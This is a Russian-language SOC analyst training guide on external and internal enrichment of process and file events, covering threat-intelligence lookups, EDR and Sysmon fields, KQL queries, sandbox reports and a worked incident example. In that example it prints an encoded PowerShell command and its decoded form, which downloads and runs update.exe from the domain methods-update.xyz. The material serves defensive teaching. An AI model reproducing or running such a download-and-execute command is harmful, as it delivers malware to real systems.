# Внешнее и внутреннее обогащение по процессу и файлу для SOC L1

## Внешнее обогащение по процессу и файлу: фундамент контекстного анализа

Внешнее обогащение (external enrichment) — это процесс дополнения события или индикатора данными из источников, находящихся за пределами контролируемой инфраструктуры организации. Для SOC-аналитика первого уровня оно служит первым фильтром, позволяющим быстро отделить подозрительную активность от ложного срабатывания за счёт привязки глобальной репутации к таким артефактам, как имя процесса, его командная строка, хэш исполняемого файла, IP-адрес, с которого был загружен файл, или домен, упомянутый в аргументах запуска. Ключевые источники внешнего обогащения — коммерческие и открытые платформы threat intelligence (TI), предоставляющие потоковые или запросные API с информацией об известных вредоносных образцах, кампаниях, инфраструктуре злоумышленников.

### Разграничение внешнего и внутреннего обогащения

Необходимо чётко различать внешнее и внутреннее обогащение, поскольку начинающие аналитики часто путают их или используют синонимично.

| Характеристика | Внешнее обогащение | Внутреннее обогащение |
|----------------|---------------------|------------------------|
| Источник данных | Облачные TI-сервисы, OSINT-фиды, отраслевые ISAC, репутационные базы (VirusTotal, OTX, Shodan, GreyNoise) | Корпоративные системы: SIEM, EDR/XDR, Active Directory, журналы ОС, инвентаризационные БД, локальные sandbox |
| Область действия | Глобальная: оценки известных угроз, не привязанные к конкретной организации | Контекст конкретной среды: роль пользователя, критичность хоста, история процесса, групповые политики |
| Частота обновления | От минут до часов, зависит от фида; частота API-запросов ограничена квотами и рейт-лимитами | Близка к реальному времени при интеграции в SIEM/SOAR; события из EDR поступают с задержкой в секунды |
| Основные форматы | STIX 2.x, MISP, TAXII, JSON-объекты API, CSV-блоклисты | UDM (Google SecOps), собственные схемы SIEM, Windows Event XML, Syslog, REST-ответы EDR |
| Примеры применения | Проверка хэша процесса по VirusTotal; репутация IP, на который обращался процесс; классификация домена командной строки | Определение, запущен ли процесс от имени привилегированной учётной записи; наличие цифровой подписи у файла, извлечённой из локального кэша |
| Зависимость от сети | Требуется доступ в Интернет или к TAXII-серверу; при разрыве обогащение недоступно | Работает полностью внутри периметра; не зависит от интернета (за исключением облачных SIEM) |

ASCII-схема сопоставления потоков внешнего и внутреннего обогащения для одного события процесса:

```text
[SIEM получает событие создания процесса]
│
├──(внешнее обогащение)──▶ VirusTotal (хэш файла, репутация IP, домены) ──обогащённая мета──▶ [объединённый UDM-рекорд]
│
├──(внутреннее обогащение)──▶ EDR (контекст дерева процессов, подпись, привилегии) ──локальный профиль──▶ [объединённый UDM-рекорд]
│
└──[Объединённый UDM-рекорд] ──▶ обнаружение и оповещение аналитика L1
```

### Источники и форматы внешнего обогащения

Для процесса и файла внешнее обогащение опирается на следующие ключевые идентификаторы:

- **Хэш исполняемого файла (MD5, SHA1, SHA256)** — основная точка входа в TI-сервисы; практически все платформы поддерживают поиск по SHA256.
- **Полный путь процесса и его командная строка** — из них извлекаются косвенные индикаторы: имена доменов, URL, IP-адреса, использованные в параметрах (например, `powershell.exe -EncodedCommand <base64>` может содержать C2-адрес).
- **Родительский процесс и его хэш** — по нему можно определить, был ли процесс запущен легитимной родительской программой (например, `winword.exe` → `cmd.exe` → `powershell.exe`), а также проверить репутацию родителя.
- **Цифровая подпись файла** — информация об издателе, статусе (действительна/отозвана) сравнивается с данными глобальных баз отозванных сертификатов.

Основной протокол обмена — TAXII 2.1 поверх HTTPS, данные кодируются в STIX 2.x. TI-платформы предоставляют REST API с лимитами и ключами доступа. Пример запроса к API VirusTotal для проверки хэша процесса иллюстративен (реальный ключ API не приводится):

```bash
curl -s -H "x-apikey: <ваш_api_ключ>" \
  "https://www.virustotal.com/api/v3/files/<sha256>" | jq '.data.attributes'
```

Ожидаемый ответ содержит поля `last_analysis_stats`, `meaningful_name`, `tags`, `signature_info`, `popular_threat_classification`. Для процесса это позволяет получить, например, соотношение детектов (0/70 — чисто, 45/70 — вредоносное), а также узнать, под какими именами образец известен (family labels).

Google SecOps SIEM, согласно документации [Enrichment](https://docs.cloud.google.com/chronicle/docs/event-processing/data-enrichment), применяет обогащение по артефактам (файловым хэшам) по принципу «first-match»: система последовательно проверяет приоритетный список источников и останавливается на первом найденном значении. Это означает, что в UDM-событие попадёт наиболее приоритетная запись, например, из собственной Google Threat Intelligence, а не из внешнего фида, если тот расположен ниже в цепочке. Для файлов это критично: аналитик L1 должен понимать, что поле `file.md5` в событии может быть уже обогащено данными из внутреннего репозитория приоритетнее, чем из VirusTotal.

Для IP, встречающихся в командной строке процесса, Google SecOps применяет обогащение GeoIP автоматически: всякий IP в UDM-событии получает геолокацию и провайдера. Это позволяет быстро оценить, характерно ли соединение для данной географии. Внешние фиды, такие как Cyren Threat Intelligence (упоминаемые в источнике Data443), поставляют репутацию IP с гранулярностью категорий: malware, phishing, scanner, tor-exit.

### Практические приёмы применения внешнего обогащения аналитиком L1

При поступлении оповещения о подозрительном процессе (например, `mshta.exe` с аргументом URL) аналитик выполняет следующие шаги, не покидая консоли SIEM:

1. **Проверка хэша исполняемого файла** — запрос к TI-платформе (VirusTotal, Hybrid Analysis) через встроенный виджет или прямую команду API. Оценивается соотношение детектов, метки, известные имена.
2. **Распаковка индикаторов из командной строки** — выделение IP-адресов и доменов с последующей проверкой их репутации через тот же API или через специализированные сервисы (например, URLhaus для URL, AbuseIPDB для IP). Важно: при использовании автоматического обогащения SIEM (как в Microsoft Sentinel, описанном в Data443) эти шаги могут выполняться до попадания оповещения в очередь, и аналитик видит уже готовые поля. Однако в учебной среде полезно уметь делать это вручную.
3. **Сопоставление с известными кампаниями** — если TI-отчёт содержит ссылки на MITRE ATT&CK техники, например T1059.001 (PowerShell) или T1218.005 (Mshta), аналитик сразу понимает тактику злоумышленника.

Приведённая из источника Data443 информация о том, что обогащение снижает время расследования с 20 до 2–5 минут на алерт, подчёркивает важность навыка интерпретации полей `threat_indicator` и `reputation_score` именно для L1, который должен принять решение об эскалации или закрытии инцидента.

### Типичные ошибки и ограничения

- **Излишнее доверие к единичному фиду** — 0 детектов в VirusTotal не гарантирует безопасность, особенно при целевом малвари с низким распространением. Необходимо учитывать давность первой загрузки и количество антивирусных движков.
- **Rate-limit API** — внешние сервисы ограничивают количество запросов в минуту; аналитик не должен использовать ручные запросы на каждый процесс, полагаясь на предварительное обогащение SIEM.
- **Устаревшие индикаторы** — фиды должны содержать политики устаревания (aging). Студент должен понимать, что IOC, не подтверждённый за последние 30 суток, не следует считать критичным без дополнительных проверок.

Таким образом, внешнее обогащение даёт быстрый ответ на вопрос «известно ли это зло», но не даёт ответа на вопрос «уместно ли это в нашей среде». Для этого необходимо внутреннее обогащение.

## Внутреннее обогащение по процессу: операционный контекст среды

Внутреннее обогащение по процессу (process enrichment) — это присоединение к событию создания процесса метаданных из собственных источников организации: EDR-агента, журналов Windows/Linux, каталогов пользователей и компьютеров (Active Directory), систем управления конфигурациями. Оно отвечает на вопросы, имеющие значение для конкретной инфраструктуры: насколько критичен хост, имеет ли пользователь право запускать подобные процессы, является ли родительская цепочка типичной для данной рабочей станции.

### Ключевые поля процесса для внутреннего обогащения

| UDM-поле (Google SecOps) или аналог | Назначение | Внутренний источник |
|--------------------------------------|------------|----------------------|
| `principal.process.file.full_path` | Полный путь исполняемого файла | EDR, Sysmon (Event ID 1) |
| `principal.process.command_line` | Аргументы запуска, часто содержат индикаторы | Sysmon, Windows Event ID 4688 |
| `principal.process.parent_process.file.full_path` | Родительский процесс | Sysmon Event ID 1, EDR |
| `principal.process.parent_process.command_line` | Командная строка родителя (важна для выявления дочернего подмены) | EDR |
| `principal.process.file.md5` / `sha256` | Хэши файла процесса и родителя | Sysmon, EDR |
| `principal.user.userid` / `windows_sid` | Учётная запись, от которой запущен процесс | Active Directory, локальный SAM |
| `principal.user.group_identifiers` | Группы безопасности пользователя (Domain Admins? Local Admin?) | AD, LSASS, EDR |
| `principal.hostname` | Имя хоста | Sysmon, Windows Event Log |
| `principal.asset.hostname` | Разрешённый актив с критичностью (из CMDB) | Интеграция SIEM с CMDB, enrichment logic |
| `principal.ip` / `src.ip` | IP-адрес хоста на момент запуска | Сетевые журналы, DHCP-логи |
| `principal.process.file.signature_status` | Статус цифровой подписи: Valid, Invalid, Unsigned | EDR (вытаскивает из свойств файла) |

### Архитектура обогащения по процессу

Следующая ASCII-диаграмма иллюстрирует, как события от агентов EDR и Windows Event Forwarding объединяются с данными из Active Directory и CMDB для создания полного профиля процесса:

```text
[Windows/Linux хост] ── Sysmon/EDR-агент ──▶ [Event Queue] ──▶ [SIEM Ingestion]
                                                        │
[Active Directory] ──(LDAP Query user/group)────────────┼──▶ [Enrichment Pipeline]
                                                        │         │
[CMDB / Asset Management] ──(Asset Criticality)─────────┘         │
                                                                   ▼
                                          [Обогащённый UDM-рекорд процесса]
                                                                   │
                                                                   ▼
                                          [Analyst L1: видит роль, крит.хоста, историю]
```

### Источники и логика обогащения

1. **Sysmon Event ID 1 (Process Create)** — основной поставщик полноты артефактов процесса на Windows. Событие содержит хэши (SHA256, MD5), путь и командную строку как текущего, так и родительского процесса, идентификатор сессии (LogonId), который можно обогатить из Event ID 4624. Аналитик должен уметь вручную сопоставить LogonId с типом входа (интерактивный, сетевой, batch) для понимания вектора компрометации.

2. **Windows Event ID 4688** — включается через групповую политику (Audit Process Creation). Содержит меньше полей, чем Sysmon, но доступен без установки дополнительных компонентов. Используется в средах, где Sysmon не развёрнут.

3. **EDR-агенты (CrowdStrike, SentinelOne, Defender for Endpoint)** — предоставляют обогащённую модель процесса, обычно включающую:
   - Дерево процессов вплоть до сессии пользователя;
   - Инжектированные потоки, загруженные DLL;
   - Репутацию файла на основе локального облака;
   - Оценку поведения (Behavioral Score) для процесса.

При интеграции с SIEM эти данные передаются через REST API или через стандартизованные схемы, например, Microsoft Sentinel использует таблицу `DeviceProcessEvents`. Обогащение данными пользователя приходит из того же EDR, если агент имеет доступ к AD или сессиям, но иногда требуется дополнительное соединение с AD через LDAP-коннектор.

### Практические команды и запросы

Внутреннее обогащение по процессу в SOC часто выполняется через Kusto-запросы (Sentinel, Defender) или поисковые запросы в SIEM. Ниже приведён иллюстративный запрос, извлекающий контекст процесса и обогащающий его данными о пользователе и группах:

```kql
let SuspiciousParent = datatable(CommandLine:string, ParentProcess:string) [
    "powershell -EncodedCommand SQBFAFgA...", @"C:\Windows\System32\cmd.exe"
];
DeviceProcessEvents
| where Timestamp > ago(1h)
| where ProcessCommandLine has_any (SuspiciousParent.CommandLine)
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, 
          SHA256, InitiatingProcessCommandLine, InitiatingProcessSHA256
| join kind=leftouter (IdentityLogonEvents
    | where Timestamp > ago(1h)
    | project AccountName, LogonType, TargetDeviceName=DeviceName)
    on AccountName
```

Такой запрос одновременно предоставляет хэши, цепочку родительского процесса и тип входа в систему — мощный внутренний контекст для анализа без единого внешнего запроса.

В Google SecOps логика обогащения пользовательских данных по процессу («User enrichment») задействует поля `principal.user.userid`, `windows_sid`, ищет их в aliasing-таблицах и по первому совпадению извлекает идентификационные атрибуты (принцип «first match» для пользователей, согласно документации). Это значит, что если один и тот же пользователь идентифицирован и через SAM-имя, и через SID, в UDM попадёт наиболее приоритетный источник. Следовательно, при анализе нужно проверять, присутствует ли SID, и валидировать сопоставление по нему.

### Типичные индикаторы процесса, требующие внутреннего обогащения

- Процесс `powershell.exe` запущен пользователем, не входящим в группу «IT Admin».
- Процесс `regsvr32.exe` запущен без абсолютного пути, из временной папки (`C:\Users\<user>\AppData\Local\Temp\`).
- Родительский процесс — скрипт или программа, которая обычно не порождает дочерние (например, `winword.exe` запускает `cmd.exe`); обогащение историческими данными покажет частоту подобной цепочки.
- Процесс имеет историю сетевых подключений (запрос к внутреннему NetFlow), которая отсутствует для данного подразделения.

Внутреннее обогащение сетевого контекста процесса может выполняться с помощью таблиц артефактов: если EDR передаёт событие сетевого соединения с указанием идентификатора процесса, SIEM обогащает событие процесса IP-адресом, с которым взаимодействовал вредоносный процесс, и затем этот IP уже может быть проверен внешними фидами или сравнён со списком легитимных серверов обновлений из внутренней базы.

## Внутреннее обогащение по файлу: атрибуты, репутация и анализ в периметре

Внутреннее обогащение по файлу дополняет внешнюю проверку хэша данными, доступными только внутри организации: локальные антивирусные вердикты, цифровые подписи из корпоративного PKI, расширенные атрибуты файловой системы, а также результаты динамического анализа в изолированной «песочнице» на собственной инфраструктуре. Для аналитика L1 эта информация особенно ценна, когда внешние источники не дают определённого ответа (например, файл — новый, нулевых детектов, но запущен из подозрительной локации).

### Механизмы и источники внутреннего обогащения файлов

| Источник | Обогащаемые атрибуты | Как используется аналитиком L1 |
|----------|-----------------------|--------------------------------|
| Локальный антивирусный сканер (Microsoft Defender, Kaspersky Endpoint) | Имя обнаружения, вердикт (Clean/Malicious/Suspicious), время последнего сканирования | Если EDR сообщает, что тот же файл уже детектирован локальным AV как `Trojan:Win32/Emotet`, эскалация происходит немедленно |
| Корпоративный репозиторий образцов и песочница (Cuckoo, Joe Sandbox, FireEye AX) | Поведенческий отчёт: создаваемые файлы, ключи реестра, исходящие соединения | Если аналитик загрузил файл в песочницу, он может сравнить его действия с текущим оповещением и подтвердить вредоносность |
| Аудит файловой системы (Windows SACL, Linux auditd) | Владелец файла, время создания/изменения/доступа, зона NTFS (Mark-of-the-Web) | Файл, загруженный из интернета, имеет альтернативный поток данных `Zone.Identifier`, в котором хранится URL источника — это встроенный механизм обогащения |
| База данных цифровых сертификатов в AD (Enterprise PKI) | Статус подписи (действителен, отозван, не доверен), издатель | Если подпись валидна и издатель — внутренний центр сертификации, процесс считается легитимным (например, корпоративный инсталлятор) |
| Управление конфигурацией ПО (SCCM, Ansible, внутренний репозиторий софта) | Ожидаемая версия, путь установки, разрешённые имена файлов | Процесс `nc.exe`, обнаруженный в `C:\Program Files (x86)\`, но не принадлежащий учтённому ПО, — красный флаг |
| File Integrity Monitoring (FIM) | Хэш файла до/после изменения, тип изменения | Если создан новый `.exe` в системной папке, и его хэш отсутствовал в эталонном слепке — инцидент |

### Пример схемы обогащения файла через аналитический пайплайн организации

```text
[Событие: новый файл process.exe обнаружен EDR]
│
├──(статическое обогащение)──▶ Локальный AV: детект?... Нет ──▶ проверка цифровой подписи: издатель "Microsoft Corporation", подпись валидна ──▶ репутация повышается
│
├──(динамическое обогащение)──▶ загрузка в корпоративную песочницу: процесс создаёт дочерние cmd.exe, обращается по IP 100.20.30.40:8080 ──▶ поведенческий вердикт Malicious
│
└──(объединённый Rekord)──▶ аналитик L1 видит противоречие: подпись Microsoft, но поведение зловредное ──▶ эскалация на L2
```

### Детализация обогащающих полей для файла в UDM

Стандартизованная структура файла в Google SecOps включает поля `file.full_path`, `file.md5`, `file.sha256`, `file.size`, `file.mime_type`. Внутреннее обогащение может добавить расширенные атрибуты, зависящие от среды, например `file.first_seen` (время первого обнаружения в сети организации) или `file.certificate.status`. В консоли аналитика эти поля часто представлены в карточке оповещения и позволяют за секунды оценить:

- **Расположение файла:** путь к файлу в UDM обогащается из EDR; если файл находится в `$Recycle.Bin` или временной папке пользователя, это автоматически повышает приоритет.
- **Зона загрузки:** Mark-of-the-Web — внутренний атрибут на NTFS. При наличии `ZoneId=3` (Internet) процесс, порождённый этим файлом, помечается как потенциально опасный; это уже часть обогащения, выполняемая EDR (например, Defender для конечной точки).
- **Владелец и права доступа:** извлечённые из локальной системы, они показывают, ограничен ли файл правами обычного пользователя или имеет права SYSTEM.

### Инструменты и команды для внутреннего обогащения файла

Аналитик L1 может использовать EDR-запросы для локального сбора информации о файле без физического доступа к хосту. Иллюстративный пример через PowerShell-модуль Defender:

```powershell
Get-MpComputerStatus | Select-Object *Signature*
Get-MpThreatDetection | Where-Object {$_.Resources -like "*<SHA256>*"}
```

Первая команда покажет статус антивирусных сигнатур; вторая — историю детектов для конкретного файла по его хэшу. Если SIEM не получил вовремя событие от AV, такой прямой запрос может заполнить пробел.

В локальных песочницах (Cuckoo Sandbox, CAPE) API позволяет отправить образец и получить отчёт в формате JSON:

```json
{
  "info": { "duration": 120, "id": 42 },
  "signatures": [
    { "name": "creates_exe", "severity": 2, "description": "Создаёт исполняемые файлы" },
    { "name": "network_tor", "severity": 3, "description": "Обращается к известным Tor-узлам" }
  ],
  "network": { "domains": [ "malicious-domain.example" ], "ips": [ "100.20.30.40" ] }
}
```

Аналитик сопоставляет сетевые артефакты из отчёта с тем, что видит в оповещении: если в поведении песочницы зафиксированы обращения к IP-адресам, совпадающим с командами процесса в алерте, вердикт подтверждается.

Также внутреннее обогащение файла может включать проверку на соответствие политикам Application Control (WDAC, AppLocker). Если файл заблокирован политикой AppLocker, но всё же был каким-то образом запущен (например, через обход с использованием regsvr32), это свидетельствует о нарушении и повышает критичность.

### Ограничения и антипаттерны

- Песочница может не эмулировать нужную среду (например, отсутствие определённых DLL), из-за чего вредоносный код не раскрывается. Поэтому отрицательный результат песочницы не гарантирует безвредность.
- Локальный AV может не распознать целенаправленный зловред, сигнатуры которого не обновлялись на конкретном хосте. Данные обогащения AV-события должны сопровождаться версией антивирусных баз.
- Обогащение из AD для файлов (владелец, подпись) требует, чтобы файл имел соответствующего учтённого владельца. Файлы, созданные через инструменты обфускации, могут не иметь полезного контекста.

## Сквозной практический пример: обогащение подозрительного запуска PowerShell и загружаемого файла

**Исходные условия:** аналитик L1 получает в SIEM оповещение о запуске `powershell.exe` с закодированной командой в сессии пользователя `ivanov` на хосте `WS-ADMIN01`. Хост не относится к критичным, пользователь — рядовой сотрудник отдела кадров. В SIEM настроены автоматические обогащения: GeoIP для IP, VirusTotal для хэшей и доменов, а также подстановка данных из AD и EDR. Аналитик открывает карточку инцидента.

**Шаг 1: Анализ первичного события и внешнее обогащение хэша родительского процесса.**  
Поле `principal.process.command_line` содержит:
```
powershell.exe -NoP -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBlAHQAbwBkAHMALQB1AHAAZABhAHQAZQAuAHgAeQB6AC8AdQBwAGQAYQB0AGUALgBlAHgAZQAnACkAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQARQBuAHYAOgBUAEUATQBQAFwAdQBwAGQAYQB0AGUALgBlAHgAZQA=
```
Аналитик декодирует base64-строку в локальном инструменте:

```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("SQBFAFgA..."))
```
Результат (иллюстративный):
```
IEX (New-Object Net.WebClient).DownloadString('http://methods-update.xyz/update.exe'); Invoke-Expression $env:TEMP\update.exe
```
Таким образом, скрипт загружает исполняемый файл из внешнего домена и запускает его. Аналитик немедленно проверяет домен `methods-update.xyz` через внешний TI:

```bash
curl -s "https://api.urlhaus.com/v1/host/" --data-urlencode "host=methods-update.xyz"
```
Ответ API URLhaus (схематично):
```json
{
  "host": "methods-update.xyz",
  "urls": [
    {"url": "http://methods-update.xyz/update.exe", "url_status": "online", "threat": "malware_download", "tags": ["emotet"]}
  ],
  "blacklists": {"spamhaus_dbl": "abused_phishing", "surbl": "listed"}
}
```
Домен фигурирует в чёрных списках и ассоциирован с семейством Emotet. Внешнее обогащение показывает высокую критичность.

**Шаг 2: Внутреннее обогащение по процессу — контекст пользователя и родительской цепочки.**  
Аналитик выполняет запрос через SIEM для получения подробной информации о процессе:

```bash
# запрос в SIEM (псевдокод)
event_type="PROCESS_LAUNCH" AND hostname="WS-ADMIN01" AND user="ivanov" AND command_line contains "EncodedCommand"
| fields hostname, user, user_groups, parent_process, parent_command_line, process_id, time
```

Ответ:
```
hostname: WS-ADMIN01
user: ivanov
user_groups: Domain Users; Отдел Кадров; Remote Desktop Users
parent_process: C:\Windows\System32\winword.exe
parent_command_line: "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\ivanov\Documents\заявка.docm"
process_id: 4408
time: 2025-03-17T09:15:00Z
```
Внутреннее обогащение показывает, что `powershell.exe` был запущен из Microsoft Word с открытым документом `заявка.docm`. Это классический признак макроса-дроппера. Группы пользователя не включают административные роли, но права локального администратора отсутствуют (проверяется через расширенный ответ EDR). Следовательно, злоумышленник получил доступ с ограниченными правами, но уже выполнил загрузку файла.

**Шаг 3: Внутреннее обогащение по файлу — локальные атрибуты и AV-статус.**  
Аналитик хочет узнать, был ли файл `update.exe` создан на диске и детектирован ли локальным антивирусом. Он использует EDR-запрос:

```sql
-- поиск файловых событий для хоста
let targetSHA256 = "<SHA256 из события загрузки>";
FileCreationEvents
| where Timestamp >= datetime(2025-03-17T09:15:00Z)
| where DeviceName == "WS-ADMIN01"
| where SHA256 == targetSHA256
| project Timestamp, FolderPath, FileName, InitiatingProcessCommandLine, 
          IsSigned, SignatureStatus
```

Результат:
```
Timestamp: 2025-03-17T09:15:12Z
FolderPath: C:\Users\ivanov\AppData\Local\Temp\
FileName: update.exe
InitiatingProcessCommandLine: powershell.exe ...
IsSigned: false
SignatureStatus: Unsigned
```
Дополнительно из того же EDR аналитик видит, что локальный Defender отреагировал через 5 секунд:
```
Timestamp: 2025-03-17T09:15:17Z
ActionType: AntivirusDetection
ThreatName: Trojan:Win32/Emotet!MSR
Severity: Severe
```
Внутреннее обогащение подтвердило вредоносность файла, подпись отсутствовала, расположение в Temp пользователя, а локальный AV уже изолировал угрозу. Дополнительно SIEM обогащает событие файла полем `file.reputation.score` из корпоративной песочницы — 95/100 (Malicious).

**Шаг 4: Объединённая оценка и решение.**  
На основе всех обогащённых данных аналитик формирует заключение:
- Внешние индикаторы (домен URLhaus, репутация IP, к которому обращался файл по данным EDR — из GeoIP: IP 100.20.30.40, страна «не соответствует региону»), внутренняя цепочка (Word → PowerShell), локальный детект AV — подтверждают инцидент компрометации через макрос.
- Аналитик эскалирует на L2 для изоляции хоста и расследования возможных горизонтальных перемещений, приложив все обогащённые артефакты: дамп командной строки, хэш файла, домен, вывод внутренних запросов.

**Ожидаемый вывод:** пример демонстрирует, как внешнее обогащение (репутация домена, GeoIP) и внутреннее обогащение (контекст родительского процесса, статус подписи, локальный AV) вместе позволяют аналитику L1 быстро и уверенно классифицировать оповещение, сокращая время анализа до пары минут.
